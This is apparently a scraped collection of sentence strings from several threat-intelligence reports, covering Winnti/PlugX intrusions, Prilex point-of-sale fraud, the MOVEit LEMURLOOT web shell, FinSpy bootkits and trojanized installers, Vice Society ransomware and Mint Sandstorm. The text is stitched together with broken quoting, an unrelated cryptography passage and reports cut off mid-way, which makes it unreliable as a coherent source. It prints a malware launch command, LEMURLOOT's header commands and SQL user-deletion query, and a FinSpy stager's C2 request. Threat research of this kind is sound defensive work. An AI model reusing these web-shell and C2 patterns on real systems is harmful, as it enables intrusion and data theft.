            "We represent that in the following graphic: Figure 10 Attack flow In the 2019/2020 case we also observed the use of a malware sample that we would classify as part of the Winnti malware family.",
            "We discovered a couple of files that were executed by the following command: Start Ins64.exe E370AA8DA0 Jumper64.dat ",

",
            "Conclusion Operation Harvest has been a long-term operation whereby an adversary maintained access for multiple years to exfiltrate data.",

            "Combining all forensic artifacts and cross-correlation with historical and geopolitical data, we have high confidence that this operation was executed by an experienced APT actor. ",
            "After mapping out all data, TTP\u2019s etc., we discovered a very strong overlap with a campaign observed in 2019/2020.",
            "A lot of the (in-depth) technical indicators and techniques match.",

            "The Winnti malware is known to be used by several actors.",
            "Within every nation-state cyber-offensive activity, there will be a department/unit responsible for the creation of the tools/malware, etc.",
            "We strongly believe that is exactly what we observe here as well.",
            "PlugX, Winnti and some other custom tools all point to a group that had access to the same tools.",
            "Whether we put name \u2018X\u2019 or \u2018Y\u2019 on the adversary, we strongly believe that we are dealing with a Chinese actor whose long-term objectives are persistence in their victims\u2019 networks and the acquisition of the intelligence needed to make political/strategic or manufacturing decisions.

            "title: Prilex: Brazilian PoS malware evolution url: https://securelist.com/prilex-atm-pos-malware-evolution/107551/ Prilex is a Brazilian threat actor that has evolved out of ATM-focused malware into modular point-of-sale malware.",
            "The group was behind one of the largest attacks on ATMs in the country, infecting and jackpotting more than 1,000 machines, while also cloning in excess of 28,000 credit cards that were used in these ATMs before the big heist.",
            "But the criminals\u2019 greed had no limits: they wanted more, and so they achieved it. ",
            "Active since 2014, in 2016, the group decided to give up ATM malware and focus all of their attacks on PoS systems, targeting the core of the payment industry.",
            "These are criminals with extensive knowledge of the payment market, and EFT software and protocols.",
            "They quickly adopted the malware-as-a-service model and expanded their reach abroad, creating a toolset that included backdoors, uploaders and stealers in a modular fashion.",
            "Since then, we have been tracking the threat actor\u2019s every move, witnessing the damages and great financial losses they brought upon the payments industry. ",
            "The Prilex PoS malware evolved out of a simple memory scraper into very advanced and complex malware, dealing directly with the PIN pad hardware protocol instead of using higher level APIs, doing real-time patching in target software, hooking operating system libraries, messing with replies, communications and ports, and switching from a replay-based attack to generate cryptograms for its GHOST transactions even from credit cards protected with CHIP and PIN technology. ",
            "It all started with ATMs during a carnival celebration During the carnival of 2016, a Brazilian bank realized that their ATMs had been hacked, with all the cash contained in those machines stolen.",
            "According to reports from law enforcement agencies, the criminals behind the attack were able to infect more than 1,000 machines belonging to one bank in the same incident, which allowed them to clone 28,000 unique credit cards across Brazil. ",
            "The attackers did not have physical access to the machines, but they were able to access the bank\u2019s network by using a DIY device containing a 4G router and a Raspberry PI.",
            "By opening a backdoor, they were able to hijack the institution\u2019s wireless connection and target ATMs at will.",
            "After obtaining initial network access, the attacker would run a network recognition process to find the IP address of each of the ATMs.",
            "With that information in hand, the attackers would launch a lateral movement phase, using default Windows credentials and then installing custom-crafted malware in the desired systems.",
            "The backdoor would allow the attacker to empty the ATM socket by launching the malware interface and typing a code supplied by the mastermind, the code being specific to each ATM being hacked. ",
            "ATM infected with Prilex ready to dispense money The malware used in the attack was named Prilex and had been developed from scratch by using privileged information and advanced knowledge of the ATM network.",
            "To control the ATMs, Prilex did patch in legitimate software for jackpotting purposes.",
            "Besides its capability to perform a jackpot, the malware was also capable of capturing information from magnetic strips on credit and debit cards inserted into the infected ATMs.",
            "Afterwards, this valuable information could be used to clone cards and steal further funds from the bank\u2019s clients. ",
            "Evolving into PoS malware Prilex has evolved out of ATM-focused malware into modular point-of-sale malware targeting payment systems developed by Brazilian vendors, the so-called EFT/TEF software.",
            "As we noted in 2018, there are many similarities between their ATM and PoS versions.",
            "Their first PoS malware was spotted in the wild in October 2016.",
            "The first two samples had 2010/2011 as the compilation date, as shown on the graph below.",
            "However, we believe that invalid compilation dates were set due to incorrect system date and time settings.",
            "In later versions, the timestamps corresponded to the times when the samples were discovered.",
            "We also noticed that in the 2022 branch, the developers started using Subversion as the version control system. ",
            "Versions of the Prilex PoS malware: 3 new versions in 2022 (download) ",
            "As we see on the graph, Prilex was highly active in 2020, but suddenly disappeared in 2021, resurfacing in 2022 with a release of three new variants. ",
            "The PoS version of Prilex is coded in Visual Basic, but the stealer module, described in this article, is in p-code.",
            "In a nutshell, this is an intermediate step between high-level instructions in a Visual Basic program and the low-level native code executed by a CPU.",
            "Visual Basic translates p-code statements into native code at runtime. ",
            "A link to the past Prilex is not the only type of PoS malware to originate in Brazil.",
            "We saw a weak link with the old Trojan-Spy.Win32.SPSniffer, which we described in 2010: both families are able to intercept signals from PIN pads, but use different approaches in doing so. PIN pads are equipped with hardware and security features to ensure that security keys are erased if someone tries to tamper with the device.",
            "In fact, the PIN is encrypted in the device upon entry using a variety of encryption schemes and symmetric keys.",
            "Most often, this is a triple DES encoder, making it hard to crack the PIN. ",
            "There is a problem, though: these devices are always connected to a computer via a USB or serial port, which communicates with the EFT software.",
            "Older and outdated PIN pad devices use obsolete and weak cryptography schemes, making it easy for malware to install a USB or serial port sniffer to capture and decrypt the traffic between the PIN pad and the infected system.",
            "This is how SPSniffer gets credit card data.",
            "Sometimes the traffic is not even encrypted. ",
            "SPSniffer: serial port sniffer allowing capture of not-encrypted traffic ",
            "The main approach used by Prilex for capturing credit card data is to use a patch in the PoS system libraries, allowing the malware to collect data transmitted by the software.",
            "The malware will look for the location of a particular set of executables and libraries in order to apply the patch, thus overwriting the original code.",
            "With the patch in place, the malware collects the data from TRACK2, such as the account number and expiration date, in addition to other cardholder information needed to perform fraudulent transactions. ",
            "Initial infection vector Prilex is not a widespread type of malware, as it is not distributed through email spam campaigns.",
            "It is highly targeted and is usually delivered through social engineering, e.g., a target business may receive a call from a \u201ctechnician\u201d who insists that the company needs to update its PoS software.",
            "The fake technician may visit the target in person or request the victims to install AnyDesk and provide remote access for the \u201ctechnician\u201d to install the malware. ",
            "Warning from a PoS vendor about Prilex social engineering attacks Messing with the EMV standard Brazil began migrating to EMV in 1999, and today, nearly all cards issued in the country are chip enabled.",
            "A small Java-based application lives inside the chip and can be easily manipulated in order to create a \u201cgolden ticket\u201d card that will be valid in most\u2014if not all\u2014point-of-sale systems.",
            "This knowledge has enabled the criminals to upgrade their toolset, allowing them to create their own cards featuring this new technology and keeping them \u201cin the business.\u201d ",
            "The initial versions of Prilex were capable of performing the \u201creplay attack,\u201d where, rather than breaking the EMV protocol, they instead took advantage of poor implementations.",
            "Since payment operators fail to perform some of the validations required by the EMV standard, criminals can exploit this vulnerability within the process to their benefit. ",
            "In this kind of attack, fraudsters push regular magnetic stripe transactions through the card network as EMV purchases, as they are in control of a payment terminal and have the ability to manipulate data fields for transactions put through that terminal.",
            "Later they switched to capturing traffic from real EMV-based chip card transactions.",
            "The thieves could insert stolen card data into the transaction stream, while modifying the merchant and acquirer bank account on the fly. ",
            "Brazilian cybercriminals have successfully launched replay attacks since at least 2014.",
            "As pointed out by Brian Krebs, a small financial institution in New England battled some $120,000 in fraudulent charges from Brazilian stores within less than two days.",
            "The bank managed to block $80,000, but the bank\u2019s processor, which approves incoming transactions when the core systems are offline, let through the other $40,000.",
            "All of the fraudulent transactions were debit charges.",
            "All of them came across MasterCard\u2019s network and appeared to be chip transactions without a PIN to MasterCard\u2019s systems. ",
            "Also worth mentioning is the attack against a German bank in 2019, which registered \u20ac1.5 million in losses and used the same technique.",
            "The Prilex gang claimed responsibility.",
            "Judging by the name fields and the functionality of the tool, they probably used the software they are selling in the black market. ",
            "To automate attacks using cloned credit cards, Prilex criminals used tools like Xiello, discovered by our telemetry in 2020.",
            "This tool allows the cybercriminals to use credit cards in a batch when making fraudulent purchases.",
            "It sends the purchase data to credit card acquirers, who then approve or deny the transactions. ",
            "Xiello tool used by Prilex to automate transactions ",
            "As the payment industry and credit card issuers fixed EMV implementation errors, replay attacks became obsolete and ineffective, pushing the Prilex gang to innovate and adopt other ways of credit card fraud. ",
            "From \u201cReplay\u201d to \u201cGhost\u201d The latest versions of Prilex show certain differences to previous ones in the way the attack occurs: the group has switched from the replay attacks to fraudulent transactions using cryptograms generated by the victim card during the in-store payment process, referred to by the malware authors as \u201cGHOST transactions.\u201d ",
            "In these attacks, the Prilex samples were installed in the system as RAR SFX executables that extracted all required files to the malware directory and executed the installation scripts (VBS files).",
            "From the installed files, we can highlight three modules used in the campaign: a backdoor, which is unchanged in this version except for the C2 servers used for communication; a stealer module; and an uploader module. ",
            "Prilex methods of maintaining persistence The stealer module is responsible for intercepting all communications between the point-of-sale software and the PIN pad used for reading the card during the transaction.",
            "Once it identifies a running transaction, the malware will intercept and modify the content of the transaction in order to be able to capture the card information and to request new EMV cryptograms to the victim\u2019s card.",
            "These cryptograms are then used in the GHOST transactions. ",
            "Method used to parse the PIN pad messages sent/received In order to target a specific process, the criminals will perform an initial screening of the machine\u2014to check if it is an interesting target with enough credit card transactions and to identify the process they will target. ",
            "After the process is identified, the malware will move forward to install the hooks needed to intercept the transaction information.",
            "As the communication between the PoS software and the card reader happens through the COM port, the malware will install a hook to many Windows APIs inside the targeted process, aiming to monitor and change data as needed.",
            "Interestingly enough, instead of allocating memory to the hook procedure, Prilex finds free space within the modules memory, a technique called code cave, making it hard for some security solutions to detect the threat in an infected system. ",
            "Hook code added into CloseHandle process All captured information from the transaction is saved to an encrypted file placed in a directory previously set by the malware configuration.",
            "Those files will later be sent to the malware C2 server, allowing the cybercriminals to make transactions through a fraudulent PoS device registered in the name of a fake company. ",
            "Captured credit card data that will be later sent to the operator server The previous version monitored the transaction in order to get the cryptogram, generated by the card for the original transaction, and then to perform a replay attack using the collected cryptogram.",
            "In this case, the cryptogram has the same ATC (Application Transaction Counter), allowing the fraudulent transaction to be identified by the reuse of the ATC as well as the fact that the date inside the cryptogram did not match the date when it was submitted, as the fraudulent transactions were submitted at a later point in time. ",
            "In GHOST attacks performed by the newer versions of Prilex, it requests new EMV cryptograms after capturing the transaction.",
            "These cryptograms will then be used in a fraudulent transaction through one of the cybercrime tools whose output log can be seen below. ",

            "title: Zero-Day Vulnerability in MOVEit Transfer Exploited for Data Theft url: https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft Mandiant has observed wide exploitation of a zero-day vulnerability in the MOVEit Transfer secure managed file transfer software for subsequent data theft.",
            "This vulnerability was announced by Progress Software Corporation on May 31, 2023 and has been assigned CVE-2023-34362.",
            "Based on initial analysis from Mandiant incident response engagements, the earliest evidence of exploitation occurred on May 27, 2023 resulting in deployment of web shells and data theft.",
            "In some instances, data theft has occurred within minutes of the deployment of web shells.",
            "Mandiant currently attributes this activity to UNC4857, a newly created threat cluster with unknown motivations that has impacted organizations operating in a wide range of industries based in Canada, India, and the U.S., but their impact is almost certainly broader.",
            "The seemingly opportunistic nature of this campaign and subsequent data theft activity is consistent with activity that we\u2019ve seen from extortion actors, which means victim organizations could potentially receive ransom emails in the coming days to weeks.",
            "Following exploitation of the vulnerability, the threat actors are deploying a newly discovered LEMURLOOT web shell with filenames that masquerade as human.aspx, which is a legitimate component of the MOVEit Transfer software.",
            "Mandiant has observed several POST requests made to the legitimate guestaccess.aspx file before interaction with the LEMURLOOT webshell, indicating SQLi attacks were directed towards that file. ",
            "We have observed LEMURLOOT samples with the filenames human2.aspx and _human2.aspx.",
            "Various samples with the name human2.aspx were uploaded to VirusTotal beginning on May 28, 2023.",
            "Samples of LEMURLOOT have been uploaded to public repositories from several additional countries\u2014including Italy, Pakistan, and Germany\u2014suggesting that UNC4857 has also impacted organizations in these nations. ",
            "LEMURLOOT provides functionality tailored to execute on a system running MOVEit Transfer software, including the ability to generate commands to enumerate files and folders, retrieve configuration information, and create or delete a user with a hard-coded name.",
            "Initial analysis suggests that the LEMURLOOT web shell is being used to steal data previously uploaded by the users of individual MOVEit Transfer systems. ",
            "Mandiant is aware of multiple cases where large volumes of files have been stolen from victims' MOVEit transfer systems.",
            "LEMURLOOT can also steal Azure Storage Blob information, including credentials, from the MOVEit Transfer application settings, suggesting that actors exploiting this vulnerability may be stealing files from Azure in cases where victims are storing appliance data in Azure Blob storage, although it is unclear if theft is limited to data stored in this way. ",
            "In many cases, the scanning and exploitation leading to the delivery of LEMURLOOT was sourced from IP addresses in the range 5.252.188.0/22, however interaction with the web shell and data theft came from different systems.",
            "Many of the hosts used to support these second-stage operations hosted RDP services with certificates generated between May 19 and 22, which is suggestive of when this infrastructure may have been staged. ",
            "Analysis of this intrusion activity is ongoing and will be reflected on the CAMP.23.037 page within Mandiant Advantage; we will also update this blog post if and when additional information becomes available.",
            "Along with this blog post, Mandiant has produced a detailed MOVEit Containment and Hardening guide to assist organizations with this event.",
            "The document contains guidance on the following key items: Containment Measures Application and Infrastructure Hardening Logging and Hunting Recommendations LEMURLOOT AnalysisLEMURLOOT is a web shell written in C# tailored to interact with the MOVEit Transfer platform.",
            "The malware authenticates incoming connections via a hard-coded password and can run commands that will download files from the MOVEit Transfer system, extract its Azure system settings, retrieve detailed record information, create and insert a particular user, or delete this same user.",
            "Data returned to the system interacting with LEMURLOOT is gzip compressed. ",
            "Authentication and Database Connection LEMURLOOT first checks if an incoming HTTP request contains the header field X-siLock-Comment and a corresponding 36-character GUID-formatted value, which varies across samples.",
            "It effectively uses this GUID as a password and returns an HTTP 404 status code to clients that do not pass the expected header field and value.",
            "If the correct password is passed to LEMURLOOT, it sends a header response X-siLock-Comment and value comment, indicating the connection is successful and can accept tasking.",
            "The malware connects to a SQL server from the executing host using the settings retrieved using SystemSettings.",
            "DatabaseSettings().",
            "It then processes data received from the connecting client, parsing expected commands from the following HTTP header fields: X-siLock-Step1, X-siLock-Step2, and X-siLock-Step3. X-siLock-Step1 Command SequenceIf the value of the header field X-siLock-Step1 is -1, LEMURLOOT retrieves and returns the Azure system settings from MOVEit Transfer, including the configured Azure Blog storage account, and its associated key and container (AzureBlobStorageAccount, AzureBlobKey, and AzureBlobContainer).",
            "It then performs SQL queries to retrieve files, file size, folders, file owners, and institution name data.",
            "The resulting data is gzip compressed and returned to the client interacting with LEMURLOOT. ",
            "If the X-siLock-Step1 header field value is -2, it deletes a user account with the LoginName and RealName set to \"Health Check Service\" using the SQL command in Figure 1.",
            "Note that this user is inserted using the following functionality. ",
            "Figure 1: MOVEit user deletion command Delete FROM users WHERE RealName='Health Check Service' X-siLock-Step2 and X-siLock-Step3 Command Sequence If the value of header field X-siLock-Step1 is neither -1 or -2, the malware parses the values from header fields X-siLock-Step2 and X-siLock-Step3 and stores them in variables named fileid and folderid, respectively. ",
            "If the values of fileid and folderid are not null, the malware retrieves the file from the local MOVEit Transfer system with these same values, gzip compresses it, and returns it to the connecting client. ",
            "If the fileid and folderid variables are null, LEMURLOOT attempts to identify an existing account with permission level \u201c30\u201d and",
            "InstID = the value set from \"X-siLock-Step1\" otherwise it creates a new account with a randomly generated username and with LoginName and RealName values set to \"Health Check Service\" This account is inserted it into an active MOVEit application session. ",
            "Attribution Preliminary analysis has not yet yielded evidence of concrete overlaps between UNC4857 and existing threat clusters at this time.",
            "However, there are some notable, but broad similarities between the tactics, techniques, and procedures (TTPs) used by UNC4857 and those associated with FIN11 data theft extortion activity.",
            "For example, UNC4857 and suspected FIN11 threat cluster UNC2546 have both used zero day vulnerabilities to target file transfer systems, then used tailored web shells for data theft.",
            "Mandiant has also observed at least one actor associated with CLOP recently seeking partners to work on SQL injections.",
            "However, we currently have insufficient evidence to determine if there is a relationship between UNC4857 and FIN11.",
            "Ongoing analysis of emerging activity may provide additional insights.",
            "Implications Mandiant routinely observes threat actors with varying motivations targeting sensitive data.",
            "For example, state-sponsored threat actors have demonstrated ongoing interest in targeting entities with policy research, military and government files, intellectual property, and personally identifiable information.",
            "Cyber criminals can also directly monetize stolen data via extortion operations, post it for sale on underground forums, or leverage it in secondary operations such as business email compromise.",
            "While Mandiant currently has insufficient evidence to attribute this recent activity to a known threat actor, it is reminiscent of prior mass exploitation events targeting file transfer software and leading to FIN11-attributed data theft extortion via the CL0P^_- LEAKS data leak site (DLS).",
            "In multiple cases, several weeks after the attackers steal data, FIN11 sent emails demanding an extortion payment in return for not publishing the data on the CL0P^_- LEAKS DLS.",
            "The delay in reaching out to victim organizations with a ransom demand could be due to various factors, such as extending the amount of time that the zero day vulnerability remained undetected and/or capacity to negotiate with a large number of victims simultaneously.",
            "If the goal of this operation is extortion, we anticipate that victim organizations could receive extortion emails in the coming days to weeks.",
            "Detections The following YARA rules are not intended to be used on production systems or to inform blocking rules without first being validated through an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives.",

            "title: FinSpy: unseen findings url: https://securelist.com/finspy-unseen-findings/104322/ FinSpy, also known as FinFisher or Wingbird, is an infamous surveillance toolset.",
            "Kaspersky has been tracking deployments of this spyware since 2011.",
            "Historically, its Windows implant was distributed through a single-stage installer.",
            "This version was detected and researched several times up to 2018.",
            "Since that year, we observed a decreasing detection rate of FinSpy for Windows.",
            "While the nature of this anomaly remained unknown, we began detecting some suspicious installers of legitimate applications, backdoored with a relatively small obfuscated downloader.",
            "We were unable to cluster those packages until the middle of 2019 when we found a host that served these installers among FinSpy Mobile implants for Android.",
            "Over the course of our investigation, we found out that the backdoored installers are nothing more than first stage implants that are used to download and deploy further payloads before the actual FinSpy Trojan. ",
            "Apart from the Trojanized installers, we also observed infections involving usage of a UEFI or MBR bootkit.",
            "While the MBR infection has been known since at least 2014, details on the UEFI bootkit are publicly revealed in this article for the first time. ",
            "We decided to share some of our unseen findings about the actual state of FinSpy implants.",
            "We will cover not only the version for Windows, but also the Linux and macOS versions, since they have a lot of internal structure and code similarities. ",
            "The full details of this research, as well as future updates on FinSpy, are available to customers of the APT reporting service through our Threat Intelligence Portal. ",
            "Contact: intelreports@kaspersky.com UEFI infection During our research, we found a UEFI bootkit that was loading FinSpy.",
            "All machines infected with the UEFI bootkit had the Windows Boot Manager (bootmgfw.efi) replaced with a malicious one.",
            "When the UEFI transfers execution to the malicious loader, it first locates the original Windows Boot Manager.",
            "It is stored inside the efi\\microsoft\\boot\\en-us\\ directory, with the name consisting of hexadecimal characters.",
            "This directory contains two more files: the Winlogon Injector and the Trojan Loader.",
            "Both of them are encrypted with RC4.",
            "The decryption key is the EFI system partition GUID, which differs from one machine to another. ",
            "Sample contents of the \\efi\\microsoft\\boot\\en-us\\ directory Once the original bootloader is located, it is loaded into memory, patched and launched.",
            "The patched launcher: Patches the function of the OS loader that transfers execution to the kernel The patched function hooks the kernel\u2019s PsCreateSystemThread function, which, when called for the first time, creates an additional thread that decrypts the next loader stage and launches it. ",
            "The next stage: Locates the Trojan loader file on the EFI partition and decrypts it Waits until a user logs on and injects the Trojan loader into exe. ",
            "The Trojan loader: Extracts the Trojan from resources and drops it under the name dll Decrypts the Trojan with a XOR-based cipher and unpacks it with aPLib Reflectively loads and launches the Trojan. ",
            "MBR infection Older machines that do not support UEFI can be infected through the MBR.",
            "When the victim machine starts up, the infected MBR copies the initial loader code from the last megabyte of the hard drive to the highest available memory located before the EBDA1.",
            "This code hooks the 13h and 15h BIOS interrupts and then launches the original MBR.",
            "The 15h interrupt makes sure that the Windows loader does not overwrite the copied code.",
            "When this interrupt is called to get the size of the area before the EBDA, the hook will reduce the amount of available memory.",
            "As for the 13h interrupt hook (which manages reading information from disk), it patches the OS loader when it is read from disk.",
            "Just as in the case with the EFI infection, the hooked functions place their own hooks on further OS loading stages.",
            "The last hook in the chain creates a thread in the kernel that injects the next stage into winlogon.exe. ",
            "In case the infection is installed on a 32-bit machine, the process of injecting code into winlogon.exe is more complex than the one observed in the UEFI infection.",
            "It is as follows: A thread with trampoline shellcode is created inside exe. ",
            "This shellcode duplicates the exe process handle and transfers it to explorer.exe. ",
            "The shellcode injects another trampoline shellcode in Explorer. ",
            "The second shellcode makes exe inject the Trojan loader back into winlogon.exe. ",
            "This roundabout way of injecting code is intended to trick security solutions. ",
            "The injected Trojan loader is the same as the UEFI one. ",
            "User Mode Infection Overview This infection is by far the most complex.",
            "In short, the attack scenario is as follows: ",
            "The victim downloads a Trojanized application and executes it. ",
            "During its normal course of operation the application connects to a C2 server, downloads and then launches a non-persistent component called the Pre-Validator.",
            "The Pre-Validator ensures that the victim machine is not used for malware analysis. ",
            "The Pre-Validator downloads Security Shellcodes from the C2 server and executes them.",
            "In total, it deploys more than 30 shellcodes.",
            "Each shellcode collects specific system information (e.g. the current process name) and uploads it back to the server. ",
            "In case a check fails, the C2 server terminates the infection process.",
            "Otherwise, it continues sending shellcodes. ",
            "If all security checks pass, the server provides a component that we call the Post-Validator.",
            "It is a persistent implant likely used to ensure that the victim is the intended one.",
            "The Post-Validator collects information that allows it to identify the victim machine (running processes, recently opened documents, screenshots) and sends it to a C2 server specified in its configuration. ",
            "Depending on the information collected, the C2 server may command the Post-Validator to deploy the full-fledged Trojan platform or remove the infection. ",
            "Overview of the user mode infection Trojanized applications Throughout our research, we identified numerous legitimate applications backdoored with FinSpy.",
            "Examples include software installers (e.g. TeamViewer, VLC Media Player, WinRAR) as well as portable applications. ",
            "All observed backdoored application samples have their original digital signature.",
            "It is invalid, which indicates that the application has been patched.",
            "While the entry point function of the application looks clear, inspection of the executable\u2019s PE file sections does reveal anomalies: the backdoored application has its last section (.rsrc on the screenshot below) expanded by 51 KB. Sections of the original (left) and backdoored (right) application Apart from that, a part of code from the .text section (roughly 8 KB) is overwritten with heavily obfuscated code, with the original application code placed in the expanded last section. ",
            "When the backdoored application launches, it runs as normal, i.e. the inserted obfuscated code does not impact the application workflow.",
            "At some point the application executes a jump instruction that redirects execution to the obfuscated trampoline in the .text section.",
            "This instruction appears to be placed randomly in the code.",
            "For example, a call to the CreateWindowExW function has been replaced: The original (left) and patched (right) code of the backdoored application This trampoline is protected with an obfuscator that we dubbed FinSpy Mutator.",
            "It launches a code that: Decrypts and launches a slightly modified Metasploit Reverse HTTPS stager.",
            "The decryption procedure: Is obfuscated with FinSpy Mutator Involves applying 10 operations (ADD, SUB, XOR, ROL, ROR) to every byte of the stager Is different in every backdoored installer. ",
            "Restores the code in the .text section that was overwritten with the malicious code (recall that the original code is saved in the resource section) ",
            "Resolves relocations in the restored code Restores the instruction that has been overwritten with a jump Jumps to the restored instruction, thus resuming the execution of the original application. ",
            "The Metasploit stager connects to a configured C2 server using HTTPS for communication.",
            "In the case of 5EDF9810355DE986EAD251B297856F38, the stager sends the following GET request to the C2 server:GET https://45[.]86[.]163[.]138/blog/ASVn6Wg5VbnZxiG2PSVbaSa-G8PmI2ew2zFBQGEZbDUEmx9mE88dw0Zxmu-AeuheOJYJ1F6kTh6uA0UJDkfISp--k6bGNOuULoTSlr-AXwvWapnFLOe4QEpqY_pe3uoGC88y3JqiQifHlRRqcE9whGX_-X14BIv35Q HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0 Host: 45[.]86[.]136[.]138 Connection: Keep-Alive Cache-Control: no-cache The C2 server replies with a component that we called the Pre-Validator in response to the GET request.",

            "Unlike many other ransomware groups such as LockBit that follow a typical ransomware-as-a-service (RaaS) model, Vice Society\u2019s operations are different in that they\u2019ve been known for using forks of pre-existing ransomware families in their attack chain that are sold on DarkWeb marketplaces.",
            "These include the HelloKitty (aka FiveHands) and Zeppelin strains of ransomware as opposed to Vice Society developing their own custom payload. ",
            "In September 2022, a joint Cybersecurity Advisory (CSA) from the FBI, CISA and the MS-ISAC declared they had recently observed Vice Society actors disproportionately targeting the education sector with ransomware attacks.",
            "The CSA continued that attacks could increase as the 2022-23 school year begins and criminal ransomware groups perceive opportunities for successful attacks. ",
            "Vice Society first surfaced in the summer of 2021, and in that time frame it was seen exploiting the CVE-2021-34527 (aka PrintNightmare) vulnerability as part of their attack chain.",
            "The gang is also known to target backups and exfiltrate data from compromised systems to be leveraged for the purpose of double extortion, a common ransomware operation tactic where victims are pressured to pay a specified ransom amount in exchange for decryption and to avoid having sensitive data published on the attacker\u2019s dedicated leak site.

            "Other challenges that could increase the overall attack surface of these organizations include difficulties in controlling and managing a large number of personal devices brought in by students and staff members.",

            "Although these sectors might have dedicated IT or security teams that run traditional security solutions such as an intrusion detection system (IDS) or intrusion prevention system (IPS), ransomware threat actors are leveraging living off the land techniques that can effectively circumvent traditional signature-based detection mechanisms.",
            "These tactics require an extended detection and response (XDR) platform for more robust behavioral monitoring within a network. ",

            "A second important aspect is that in order for this hash function to provide the desired security properties (namely, collision-resistance), it is necessary for the underlying encoding function to be injective.",

            "In the context of the encoding function \u27e8\u22c5\u27e9, this means that there are no two different message chunks Mi and Mj that result in the same encoded output, see the illustration below.\n\n\n",

            "In the toy example above, we have seen an example of a simple encoding function where the bit strings were interpreted in little-endian as integers and therefore was clearly injective (within the parameters of our example).\n",
            "But even with the simple encoding function used in the toy example, care should be taken to ensure that the allowed size of the message we hash is bounded.",
            "Indeed, if we allowed larger bit strings to be hashed (such that their encoding is larger than the subgroup order), it would be easy for an attacker to compute collisions.",

            "title: Nation-state threat actor Mint Sandstorm refines tradecraft to attack high-value targets url: https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/ Over the past several months, Microsoft has observed a mature subgroup of Mint Sandstorm, an Iranian nation-state actor previously tracked as PHOSPHORUS, refining its tactics, techniques, and procedures (TTPs).",
            "Specifically, this subset has rapidly weaponized N-day vulnerabilities in common enterprise applications and conducted highly-targeted phishing campaigns to quickly and successfully access environments of interest.",
            "This Mint Sandstorm subgroup has also continued to develop and use custom tooling in selected targets, notably organizations in the energy and transportation sectors.",
            "Given this subgroup\u2019s capabilities, the profile of past targets, and the potential for cascading effects, Microsoft is publishing details on known tradecraft alongside corresponding detections and mitigations to help organizations protect against this and similar threats. ",
            "Who is Mint Sandstorm? Mint Sandstorm is Microsoft\u2019s new name for PHOSPHORUS, an Iranian nation-state actor.",
            "This new name is part of the new threat actor naming taxonomy we announced today, designed to keep pace with the evolving and growing threat landscape. ",
            "Mint Sandstorm is known to pursue targets in both the private and public sectors, including political dissidents, activist leaders, the Defense Industrial Base (DIB), journalists, and employees from multiple government agencies, including individuals protesting oppressive regimes in the Middle East. ",
            "Activity Microsoft tracks as part of the larger Mint Sandstorm group overlaps with public reporting on groups known as APT35, APT42, Charming Kitten, and TA453. ",
            "Mint Sandstorm is a composite name used to describe several subgroups of activity with ties to the same organizational structure.",
            "Microsoft assesses that Mint Sandstorm is associated with an intelligence arm of Iran\u2019s military, the Islamic Revolutionary Guard Corps (IRGC), an assessment that has been corroborated by multiple credible sources including Mandiant, Proofpoint, and SecureWorks. ",
            "In 2022, the US Department of Treasury sanctioned elements of Mint Sandstorm for past cyberattacks citing sponsorship from the IRGC. ",
            "Today, Microsoft is reporting on a distinct Mint Sandstorm subgroup that specializes in hacking into and stealing sensitive information from high-value targets.",
            "This Mint Sandstorm subgroup is technically and operationally mature, capable of developing bespoke tooling and quickly weaponizing N-day vulnerabilities, and has demonstrated agility in its operational focus, which appears to align with Iran\u2019s national priorities. ",
            "Microsoft Threat Intelligence consistently tracks threat actor activity, including Mint Sandstorm and its subgroups, and works across Microsoft Security products and services to build detections into our products that improve protection for customers.",
            "As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts.",
            "Microsoft is sharing details on these operations to raise awareness on the risks associated with their activity and to empower organizations to harden their attack surfaces against tradecraft commonly used by this Mint Sandstorm subgroup. ",
            "Recent operations From late 2021 to mid-2022, this Mint Sandstorm subgroup moved from reconnaissance to direct targeting of US critical infrastructure including seaports, energy companies, transit systems, and a major US utility and gas entity potentially in support of retaliatory destructive cyberattacks.",
            "This targeting was likely in response to Iran\u2019s attribution of cyberattacks that halted maritime traffic at a major Iranian seaport in May 2020, delayed Iranian trains in July 2021, and crashed gas station payment systems throughout Iran in late 2021.",
            "Of note, a senior cybersecurity-focused IRGC official and others close to the Iranian Supreme Leader pinned the attack affecting gas station payment systems on Israel and the United States. ",
            "This targeting also coincided with a broader increase in the pace and the scope of cyberattacks attributed to Iranian threat actors, including another Mint Sandstorm subgroup, that Microsoft observed beginning in September 2021.",
            "The increased aggression of Iranian threat actors appeared to correlate with other moves by the Iranian regime under a new national security apparatus, suggesting such groups are less bounded in their operations. ",
            "Given the hardline consensus among policymakers in Tehran and sanctions previously levied on Iran\u2019s security organizations, Mint Sandstorm subgroups may be less constrained in carrying out malicious cyber activity. ",
            "Mint Sandstorm tradecraft Microsoft has observed multiple attack chains and various tools in compromises involving this Mint Sandstorm subgroup.",
            "The TTPs detailed below area sampling of new or otherwise notable tradecraft used by this actor. ",
            "Rapid adoption of publicly disclosed POCs for initial access and persistence Microsoft has increasingly observed this Mint Sandstorm subgroup adopting publicly disclosed proof-of-concept (POC) code shortly after it is released to exploit vulnerabilities in internet-facing applications.",
            "Until 2023, this subgroup had been slow to adopt exploits for recently-disclosed vulnerabilities with publicly reported POCs, often taking several weeks to successfully weaponize exploits for vulnerabilities like Proxyshell and Log4Shell.",
            "However, beginning in early 2023, Microsoft observed a notable decrease in the time required for this subgroup to adopt and incorporate public POCs.",
            "For example, Mint Sandstorm began exploiting CVE-2022-47966 in Zoho ManageEngine on January 19, 2023, the same day the POC became public.",
            "They later exploited CVE-2022-47986 in Aspera Faspex within five days of the POC being made public on February 2, 2023. ",
            "While this subgroup has demonstrated their ability to rapidly incorporate new public POCs into their playbooks, Microsoft has also observed that Mint Sandstorm continues to use older vulnerabilities, especially Log4Shell, to compromise unpatched devices.",
            "As this activity is typically opportunistic and indiscriminate, Microsoft recommends that organizations regularly patch vulnerabilities with publicly available POCs, regardless of how long the POC has been available. ",
            "After gaining initial access to an organization by exploiting a vulnerability with a public POC, this Mint Sandstorm subgroup deploys a custom PowerShell script designed for discovery.",
            "In some cases, the subgroup does not act on the information they collect, possibly because they assess that a victim does not meet any targeting requirements or because the subgroup wishes to wait and focus on more valuable targets.",
